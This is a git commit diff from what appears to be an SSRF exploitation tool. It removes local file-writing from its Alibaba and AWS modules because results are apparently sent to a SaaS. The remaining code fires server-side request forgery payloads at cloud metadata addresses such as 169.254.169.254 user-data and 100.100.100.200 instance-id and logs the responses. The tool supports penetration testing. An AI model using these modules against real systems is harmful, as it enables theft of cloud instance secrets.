8944dad153c9af85c484808b2e0ff5540bd27d5e
Akshath Kothari <akshath.kothari@gmail.com>
2021-11-29 00:21:38 +0530

    Don't write diffs to files (#9)
    - We are already sending the diffs to the Saas, we don't need to write
      them to the user's file system.
    - Upgrade project Python version to 3.9.
    - Bump project version to 0.1.11.

--- src/ssrfmap/modules/alibaba.py
+++ src/ssrfmap/modules/alibaba.py
@@ -21,11 +21,6 @@ class exploit:
         if r != None:
             default = r.text
 
-            # Create directory to store files
-            directory = requester.host
-            if not os.path.exists(directory):
-                os.makedirs(directory)
-
             for endpoint in self.endpoints:
                 payload = wrapper_http(endpoint[1], endpoint[0], "80")
                 r = requester.do_request(args.param, payload)
@@ -35,19 +30,6 @@ class exploit:
                     # Display diff between default and ssrf request
                     logging.info("\033[32mReading file\033[0m : {}".format(payload))
                     logging.debug(diff)
-
-                    # Write diff to a file
-                    filename = endpoint[1].split("/")[-1]
-                    if filename == "":
-                        filename = endpoint[1].split("/")[-2:-1][0]
-
-                    logging.info(
-                        "\033[32mWriting file\033[0m : {} to {}".format(
-                            payload, directory + "/" + filename
-                        )
-                    )
-                    with open(directory + "/" + filename, "w") as f:
-                        f.write(diff)
 
     def add_endpoints(self):
         self.endpoints.add(("100.100.100.200", "latest/meta-data/instance-id"))
--- src/ssrfmap/modules/aws.py
+++ src/ssrfmap/modules/aws.py
@@ -27,11 +27,6 @@ class exploit:
         if r != None:
             default = r.text
 
-            # Create directory to store files
-            directory = requester.host
-            if not os.path.exists(directory):
-                os.makedirs(directory)
-
             for endpoint in self.endpoints:
                 payload = wrapper_http(endpoint[1], endpoint[0], endpoint[2])
                 r = requester.do_request(args.param, payload)
@@ -41,19 +36,6 @@ class exploit:
                     # Display diff between default and ssrf request
                     logging.info("\033[32mReading file\033[0m : {}".format(payload))
                     logging.debug(diff)
-
-                    # Write diff to a file
-                    filename = endpoint[1].split("/")[-1]
-                    if filename == "":
-                        filename = endpoint[1].split("/")[-2:-1][0]
-
-                    logging.info(
-                        "\033[32mWriting file\033[0m : {} to {}".format(
-                            payload, directory + "/" + filename
-                        )
-                    )
-                    with open(directory + "/" + filename, "w") as f:
-                        f.write(diff)
 
     def add_endpoints(self):
         self.endpoints.add(("169.254.169.254", "latest/user-data", "80"))
